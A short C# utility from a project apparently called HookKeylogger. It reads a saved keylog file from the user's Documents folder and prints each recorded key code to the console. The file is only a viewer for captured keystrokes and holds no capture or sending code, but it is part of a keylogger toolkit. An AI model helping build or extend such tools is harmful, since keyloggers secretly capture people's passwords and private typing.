using System;
using HookKeylogger.Base;
using System.IO;
using System.Windows.Forms;

namespace HookKeylogger.Utils
{
    class PrintKeyLog
    {
        static void Main(string[] args)
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\keylog";
            Console.WriteLine(path);
            Console.ReadKey();
            KeyPressBuffer kpb = new KeyPressBuffer(path);

            foreach(KeyPress ks in kpb.Keys)
            {
                Console.Write(ks.Key);
                Console.WriteLine((Keys)ks.Key);
            }
            Console.ReadKey();
        }
    }
}
